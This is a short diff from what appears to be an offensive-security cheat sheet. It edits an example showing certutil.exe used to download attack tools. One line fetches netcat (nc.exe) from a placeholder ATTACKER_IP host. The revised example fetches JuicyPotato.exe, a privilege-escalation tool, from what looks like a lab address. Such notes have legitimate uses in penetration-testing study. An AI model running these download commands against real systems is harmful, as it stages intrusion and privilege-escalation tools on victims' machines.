@@ -163,7 +163,7 @@ certutil.exe -verifyctl -split -f http://ATTACKER_IP:8000/nc.exe nc.exe
 Example:
 
 ```cmd
-certutil.exe -verifyctl -split -f http://10.10.10.32:8000/nc.exe
+certutil.exe -verifyctl -split -f http://10.10.15.190:8888/JuicyPotato.exe JuicyPotato.exe
 ```
 
 ---
